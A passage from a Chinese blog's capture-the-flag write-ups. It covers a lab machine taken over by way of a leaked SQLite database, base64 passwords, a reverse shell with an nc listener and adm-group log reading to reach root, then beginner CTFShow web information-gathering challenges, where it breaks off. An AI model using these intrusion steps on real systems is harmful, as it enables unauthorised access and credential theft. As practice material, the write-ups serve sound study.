class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/base]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.62&quot;</span><br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /miao/maze-sec/base/reports/http_192.168.2.62/_25-07-24_20-37-15.txt<br><br>Target: http://192.168.2.62/<br><br>[20:37:15] Starting: <br>[20:37:18] 403 -  277B  - /.ht_wsr.txt<br>[20:37:18] 403 -  277B  - /.htaccess.bak1<br>[20:37:18] 403 -  277B  - /.htaccess.sample<br>[20:37:18] 403 -  277B  - /.htaccess.orig<br>[20:37:18] 403 -  277B  - /.htaccess.save<br>[20:37:18] 403 -  277B  - /.htaccess_extra<br>[20:37:18] 403 -  277B  - /.htaccess_orig<br>[20:37:18] 403 -  277B  - /.htaccessBAK<br>[20:37:18] 403 -  277B  - /.htaccess_sc<br>[20:37:18] 403 -  277B  - /.htaccessOLD<br>[20:37:18] 403 -  277B  - /.htaccessOLD2<br>[20:37:18] 403 -  277B  - /.htm<br>[20:37:18] 403 -  277B  - /.html<br>[20:37:18] 403 -  277B  - /.htpasswd_test<br>[20:37:18] 403 -  277B  - /.htpasswds<br>[20:37:18] 403 -  277B  - /.httr-oauth<br>[20:37:19] 403 -  277B  - /.php<br>[20:37:50] 301 -  313B  - /images  -&gt;  http://192.168.2.62/images/<br>[20:37:50] 200 -  175B  - /images/<br>[20:37:54] 200 -    5KB - /LICENSE.txt<br>[20:38:09] 200 -  311B  - /README.md<br>[20:38:11] 200 -   33B  - /robots.txt<br>[20:38:12] 403 -  277B  - /server-status<br>[20:38:12] 403 -  277B  - /server-status/<br>[20:38:22] 200 -  487B  - /UPGRADE.txt<br>[20:38:23] 200 -   12KB - /users.db<br><br>Task Completed<br></code></pre></td></tr></table></figure><p>找到一个<code>user.db</code></p><h2 id="2、Sqlite3"><a href="#2、Sqlite3" class="headerlink" title="2、Sqlite3"></a>2、Sqlite3</h2><p>下载后，查看文件类型，发现是一个<code>sqlite3</code>数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/base]<br>└─# file users.db                                                           <br>users.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 2, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 2<br></code></pre></td></tr></table></figure><p>查询得到用户名和密码<code>hungry|aHVuZ3J5</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kali)-[/miao/maze-sec/base]<br>└─# sqlite3 users.db                                            <br>SQLite <span class="hljs-keyword">version</span> <span class="hljs-number">3.46</span><span class="hljs-number">.0</span> <span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-23</span> <span class="hljs-number">13</span>:<span class="hljs-number">25</span>:<span class="hljs-number">27</span><br>Enter &quot;.help&quot; <span class="hljs-keyword">for</span> <span class="hljs-keyword">usage</span> hints.<br>sqlite&gt; .<span class="hljs-keyword">table</span><br>users<br>sqlite&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users;<br><span class="hljs-number">1</span>|hungry|aHVuZ3J5<br></code></pre></td></tr></table></figure><p>尝试登录发现不对，尝试<code>base64</code>解码，得到密码<code>hungry</code>，尝试登录发现还是无法进行访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/base]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;aHVuZ3J5&quot;</span> | <span class="hljs-built_in">base64</span> -d                           <br>hungry  <br></code></pre></td></tr></table></figure><h1 id="四、获取hungry权限"><a href="#四、获取hungry权限" class="headerlink" title="四、获取hungry权限"></a>四、获取hungry权限</h1><p>尝试登录SSH，最后成功以<code>hungry:aHVuZ3J5</code>进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/base]<br>└─# ssh hungry@192.168.2.62<br>hungry@192.168.2.62<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux Base 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string"> ____                 </span><br><span class="hljs-string">| __ )  __ _ ___  ___ </span><br><span class="hljs-string">|  _ \ / _` / __|/ _ \</span><br><span class="hljs-string">| |_) | (_| \__ \  __/</span><br><span class="hljs-string">|____/ \__,_|___/\___|</span><br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hungry@Base:~$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-051a0db9a92e4dacc70212da32fd0638&#125;<br></code></pre></td></tr></table></figure><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><h2 id="1、获取www-data权限"><a href="#1、获取www-data权限" class="headerlink" title="1、获取www-data权限"></a>1、获取www-data权限</h2><p>查看<code>/var/www/html/</code>目录，发现存在文件<code>creds.txt</code>，查看找到两个账号密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hungry@Base:/var/www/html$ <span class="hljs-built_in">cat</span> creds.txt <br>guest:guest<br>admin:YWRtaW*=<br></code></pre></td></tr></table></figure><p>尝试登录<code>admin</code>发现密码错误，解密发现也错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/base]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;YWRtaW*=&quot;</span> | <span class="hljs-built_in">base64</span> -d                           <br>admibase64: 无效的输入<br></code></pre></td></tr></table></figure><p>尝试加密<code>admin</code>，发现很相同</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/base]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;admin&quot;</span> | <span class="hljs-built_in">base64</span>      <br>YWRtaW4K<br></code></pre></td></tr></table></figure><p>最后猜测，以<code>admin:YWRtaW4K=</code>成功进行后台<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507242101029.png"></p><p>进行反弹shell<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507242106646.png"></p><p>成功获取shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/base]<br>└─# nc -lvnp 4444                        <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.62] 33690<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data),4(adm)<br></code></pre></td></tr></table></figure><h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>查看<code>www-data</code>的<code>id</code>，发现属于<code>adm组</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adm用户组是Linux系统中一个特殊的用户组。此组的成员通常具有读取和写入系统日志文件、查看系统性能指标以及执行其他系统管理任务的权限。如果当前用户隶属于adm用户组，那么就可以通过查看存储 在/var/log/目录下的系统敏感日志来辅助提权。<br></code></pre></td></tr></table></figure><p>查看<code>/var/log</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Base:/$ <span class="hljs-built_in">ls</span> -la /var/log<br>total 2144<br>drwxr-xr-x  10 root root              4096 Jul 24 08:15 .<br>drwxr-xr-x  12 root root              4096 Apr  1 10:05 ..<br>-rw-r--r--   1 root root               302 Jul 20 00:12 alternatives.log<br>-rw-r--r--   1 root root             11791 Apr 11 22:03 alternatives.log.1<br>-rw-r--r--   1 root root              1658 Mar 31 04:15 alternatives.log.2.gz<br>drwxr-x---   2 root adm               4096 Jul 24 08:15 apache2<br>drwxr-xr-x   2 root root              4096 Jul 20 00:30 apt<br>-rw-r-----   1 root adm               9394 Jul 24 09:09 auth.log<br>-rw-rw----   1 root utmp                 0 Jul 19 23:58 btmp<br>-rw-rw----   1 root utmp              2688 Apr 11 21:48 btmp.1<br>-rw-r-----   1 root adm              53236 Jul 24 09:09 daemon.log<br>-rw-r-----   1 root adm                970 Jul 20 00:00 daemon.log.1<br>-rw-r-----   1 root adm               9582 Jul 19 23:58 daemon.log.2.gz<br>-rw-r-----   1 root adm              50014 Apr 11 21:37 daemon.log.3.gz<br>-rw-r-----   1 root adm              25197 Jul 24 08:15 debug<br>-rw-r-----   1 root adm              48236 Jul 19 23:58 debug.1<br>-rw-r-----   1 root adm              13708 Apr 11 21:37 debug.2.gz<br>-rw-r--r--   1 root root              2501 Jul 20 00:30 dpkg.log<br>-rw-r--r--   1 root root            148321 Apr 11 22:03 dpkg.log.1<br>-rw-r--r--   1 root root             20031 Mar 31 04:52 dpkg.log.2.gz<br>-rw-r--r--   1 root root             32064 Jul 20 00:10 faillog<br>-rw-r--r--   1 root root              1388 Apr  4 22:04 fontconfig.log<br>-rw-r-----   1 irc  adm                  0 Mar 31 04:15 inspircd.log<br>drwxr-xr-x   3 root root              4096 Mar 18 20:40 installer<br>drwxr-xr-x   2 irc  irc               4096 Mar 31 03:47 ircd<br>drwxr-sr-x+  3 root systemd-journal   4096 Mar 18 21:17 journal<br>-rw-r-----   1 root adm             172491 Jul 24 08:15 kern.log<br>-rw-r-----   1 root adm             357384 Jul 19 23:58 kern.log.1<br>-rw-r-----   1 root adm             228576 Apr 11 21:37 kern.log.2.gz<br>-rw-rw-r--   1 root utmp            292584 Jul 24 08:46 lastlog<br>-rw-r-----   1 root adm             147516 Jul 24 08:15 messages<br>-rw-r-----   1 root adm                294 Jul 20 00:00 messages.1<br>-rw-r-----   1 root adm              78049 Jul 19 23:58 messages.2.gz<br>-rw-r-----   1 root adm             198715 Apr 11 21:37 messages.3.gz<br>drwx------   2 root root              4096 Mar 18 20:40 private<br>drwxr-xr-x   3 root root              4096 Mar 18 21:17 runit<br>-rw-r-----   1 root adm               7919 Jul 24 09:09 syslog<br>-rw-r-----   1 root adm              59110 Jul 24 08:15 syslog.1<br>-rw-r-----   1 root adm              39046 Jul 23 02:17 syslog.2.gz<br>-rw-r-----   1 root adm                565 Jul 20 00:00 syslog.3.gz<br>-rw-r-----   1 root adm             108099 Jul 19 23:58 syslog.4.gz<br>-rw-r-----   1 root adm              14763 Apr 11 21:37 syslog.5.gz<br>-rw-r-----   1 root adm              89768 Apr  5 07:48 syslog.6.gz<br>-rw-r-----   1 root adm              13851 Apr  4 06:34 syslog.7.gz<br>drwxr-x---   2 root adm               4096 Jul 19 23:58 unattended-upgrades<br>-rw-r-----   1 root adm                  0 Jul 19 23:58 user.log<br>-rw-r-----   1 root adm               1690 Apr 11 22:22 user.log.1<br>-rw-rw-r--   1 root utmp            111360 Jul 24 08:46 wtmp<br></code></pre></td></tr></table></figure><p>发现一个<code>auth.log</code>日志，查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Base:/$ <span class="hljs-built_in">cat</span> /var/log/auth.log<br>Jul 19 23:58:13 moban systemd-logind[332]: Watching system buttons on /dev/input/event3 (Power Button)<br>Jul 19 23:58:13 moban systemd-logind[332]: Watching system buttons on /dev/input/event4 (Sleep Button)<br>Jul 19 23:58:13 moban systemd-logind[332]: Watching system buttons on /dev/input/event0 (AT Translated Set 2 keyboard)<br>Jul 19 23:58:13 moban systemd-logind[332]: New seat seat0.<br>Jul 19 23:58:13 moban sshd[374]: Server listening on 0.0.0.0 port 22.<br>Jul 19 23:58:13 moban sshd[374]: Server listening on :: port 22.<br>Jul 19 23:59:05 moban passwd[528]: pam_unix(passwd:chauthtok): password changed <span class="hljs-keyword">for</span> root<br>Jul 19 23:58:27 moban <span class="hljs-built_in">sudo</span>[381]: root : password changed to <span class="hljs-string">&#x27;dG9kZA==</span><br><span class="hljs-string">......</span><br></code></pre></td></tr></table></figure><p>发现<code>root</code>密码被修改成<code>dG9kZA==</code>，切换用户，成功登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Base:/$ su root<br>Password: <br> ____                 <br>| __ )  __ _ ___  ___ <br>|  _ \ / _` / __|/ _ \<br>| |_) | (_| \__ \  __/<br>|____/ \__,_|___/\___|<br>                      <br>root@Base:/# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs BASH">root@Base:/# <span class="hljs-built_in">cat</span> root/root.txt <br>flag&#123;root&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、pivotx漏洞"><a href="#1、pivotx漏洞" class="headerlink" title="1、pivotx漏洞"></a>1、pivotx漏洞</h2><p><code>PivotX 3.0.0 RC3 - Remote Code Execution (RCE)</code>，需要管理员权限<br><a href="https://www.exploit-db.com/exploits/52361">https://www.exploit-db.com/exploits/52361</a></p><h2 id="2、sqlite3"><a href="#2、sqlite3" class="headerlink" title="2、sqlite3"></a>2、sqlite3</h2><p><a href="https://xz.aliyun.com/news/8220">sqlite注入的一点总结-先知社区</a></p><h2 id="3、adm用户组提权"><a href="#3、adm用户组提权" class="headerlink" title="3、adm用户组提权"></a>3、adm用户组提权</h2><p>adm用户组是Linux系统中一个特殊的用户组。此组的成员通常具有读取和写入系统日志文件、查看系统性能指标以及执行其他系统管理任务的权限。如果当前用户隶属于adm用户组，那么就可以通过查看存储 在<code>/var/log/</code>目录下的系统敏感日志来辅助提权。</p><p>查看日志文件夹中各个文件的所属组</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">ls</span> -al /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pivotx</tag>
      
      <tag>sqlite3</tag>
      
      <tag>提权-adm组</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFShow-WEB入门-信息收集</title>
    <link href="/CTFShow/CTFShow-WEB%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/CTFShow/CTFShow-WEB%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB-1-注释泄露"><a href="#WEB-1-注释泄露" class="headerlink" title="WEB-1-注释泄露"></a>WEB-1-注释泄露</h2><p>提示：开发注释未及时删除<br>直接查看页面源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html">|<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">HTML</span>&gt;</span>|<br>|<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>|<br>|<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>|<br>|<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span>|<br>|<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CTFshow 新手入门题目 <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>|<br>|<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span>|<br>||<br>|<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>|<br>|<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>|<br>|<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>|<br>|<span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>web1:where is flag?<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>|<br>|<span class="hljs-comment">&lt;!-- ctfshow&#123;c1d9600f-fb34-4549-ae4b-bbe8e1e9841b&#125; --&gt;</span>|<br>|<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>|<br>|<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>|<br></code></pre></td></tr></table></figure><h2 id="WEB-2-JS拦截"><a href="#WEB-2-JS拦截" class="headerlink" title="WEB-2-JS拦截"></a>WEB-2-JS拦截</h2><p>提示：js前台拦截 &#x3D;&#x3D;&#x3D; 无效操作<br>直接打开开发者工具<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507230928154.png"></p><h2 id="WEB-3-数据包"><a href="#WEB-3-数据包" class="headerlink" title="WEB-3-数据包"></a>WEB-3-数据包</h2><p>提示：抓包<br>直接查看网络请求的数据包<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507230929430.png"></p><h2 id="WEB-4-robots"><a href="#WEB-4-robots" class="headerlink" title="WEB-4-robots"></a>WEB-4-robots</h2><p>提示：robots<br>访问<code>/robots.txt</code>，找到目录<code>/flagishere.txt</code>，访问即可<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507230935974.png"></p><h2 id="WEB-5-phps源码泄露"><a href="#WEB-5-phps源码泄露" class="headerlink" title="WEB-5-phps源码泄露"></a>WEB-5-phps源码泄露</h2><p>提示：phps源码泄露<br>直接访问<code>/index.phps</code>，即可下载文件，打开查看即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//ctfshow&#123;f99cedb3-f079-4343-bb72-b28dc1d0c16a&#125;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;web5:where is flag ?&quot;</span><br></code></pre></td></tr></table></figure><h2 id="WEB-6-备份文件"><a href="#WEB-6-备份文件" class="headerlink" title="WEB-6-备份文件"></a>WEB-6-备份文件</h2><p>提示：解压源码到当前目录<br>直接进行目录扫描，找到<code>www.zip</code>，解压缩，找到<code>fl000g.txt</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/ctfshow]<br>└─# dirsearch -u <span class="hljs-string">&quot;https://7d1a27dd-1523-468c-bb3c-94072a1d15a1.challenge.ctf.show/&quot;</span><br>[09:43:55] Starting: <br>[09:45:00] 200 -  486B  - /www.zip<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/ctfshow]<br>└─# unzip www.zip        <br>Archive:  www.zip<br>  inflating: index.php               <br>  inflating: fl000g.txt              <br>                                                                                                                                               <br>┌──(root㉿kali)-[/miao/ctfshow]<br>└─# <span class="hljs-built_in">cat</span> fl000g.txt                                    <br>flag&#123;flag_here&#125;<br></code></pre></td></tr></table></figure><h2 id="WEB-7-git泄露"><a href="#WEB-7-git泄露" class="headerlink" title="WEB-7-git泄露"></a>WEB-7-git泄露</h2><p>提示：版本控制很重要，但不要部署到生产环境更重要<br>直接目录扫描，找到<code>.git</code>文件，直接访问即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/ctfshow]<br>└─# curl http://bdc2fb59-28c1-41ba-85cc-4b40adca5613.challenge.ctf.show/.git/                                                            <br>ctfshow&#123;c1d04c02-4fe8-4d85-9267-4f7bbe43957b&#125;<br></code></pre></td></tr></table></figure><h2 id="WEB-8-svn泄露"><a href="#WEB-8-svn泄露" class="headerlink" title="WEB-8-svn泄露"></a>WEB-8-svn泄露</h2><p>提示：版本控制很重要，但不要部署到生产环境更重要<br>直接目录扫描，找到<code>.svn</code>文件，直接访问即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/ctfshow]<br>└─# curl http://632e7c71-4f7a-4862-a491-6e2db711e1c4.challenge.ctf.show/.svn/<br>ctfshow&#123;74a36b51-8614-4d18-9435-790b865374cf&#125;<br></code></pre></td></tr></table></figure><h2 id="WEB-9-vim缓存泄露"><a href="#WEB-9-vim缓存泄露" class="headerlink" title="WEB-9-vim缓存泄露"></a>WEB-9-vim缓存泄露</h2><p>提示：发现网页有个错别字？赶紧在生产环境vim改下</p><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，<br>当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容<br>以 index.php 为例：</p><ul><li>第一次产生的交换文件名为<code>.index.php.swp </code></li><li>再次意外退出后，将会产生名为 <code>.index.php.swo</code> 的交换文件  </li><li>第三次产生的交换文件则为 <code>.index.php.swn</code></li></ul><p>直接访问<code>/.index.php.swp</code>下载文件，查看即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/ctfshow]<br>└─# <span class="hljs-built_in">cat</span> index.php.swp                                                        <br>ctfshow&#123;d7810c95-b09f-452e-b2e7-755821952494&#125;<br></code></pre></td></tr></table></figure><h2 id="WEB-10-Cookie"><a href="#WEB-10-Cookie" class="headerlink" title="WEB-10-Cookie"></a>WEB-10-Cookie</h2><p>提示：cookie 只是一块饼干，不能存放任何隐私数据<br>直接查看cookie值即可<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507231003140.png"></p><h2 id="WEB-11-DNS"><a href="#WEB-11-DNS" class="headerlink" title="WEB-11-DNS"></a>WEB-11-DNS</h2><p>提示：域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息<br>直接使用<code>nslookup</code>查询所有解析的域名即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nslookup -query=any flag.ctfshow.com<br></code></pre></td></tr></table></figure><h2 id="WEB-12-弱密码"><a href="#WEB-12-弱密码" class="headerlink" title="WEB-12-弱密码"></a>WEB-12-弱密码</h2><p>提示：有时候网站上的公开信息，就是管理员常用密码<br>查看网站的页面，找到密码：<code>372619038</code>，直接使用<code>admin:372619038</code>登录即可<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507231010322.png"></p><h2 id="WEB-13-技术文档"><a href="#WEB-13-技术文档" class="headerlink" title="WEB-13-技术文档"></a>WEB-13-技术文档</h2><p>提示：技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码<br>访问<code>document.pdf</code>，找到相关的文档，找到后台和登录用户及密码</p><ul><li>默认后台地址：<a href="http://your-domain/system1103/login.php">http://your-domain/system1103/login.php</a></li><li>默认用户名：admin</li><li>默认密码：admin1103<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507231017375.png"></li></ul><h2 id="WEB-14-editor默认配置"><a href="#WEB-14-editor默认配置" class="headerlink" title="WEB-14-editor默认配置"></a>WEB-14-editor默认配置</h2><p>提示：有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人<br>目录扫描，找到路径<code>editor</code>，尝试上传图片，发现无法上传，但找到<code>图片空间</code>，点进行找到<code>flag</code>的路径<code>/var/www/html/nothinghere/fl000g.txt</code>，直接访问即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/ctfshow]<br>└─# curl http://1da72904-ac7d-4ea7-9d7d-f0932c17d88c.challenge.ctf.show/nothinghere/fl000g.txt <br>ctfshow&#123;8c02723b-b735-4136-bdd5-73dd501cdc00&#125;  <br></code></pre></td></tr></table></figure><h2 id="WEB-15-社工"><a href="#WEB-15-社工" class="headerlink" 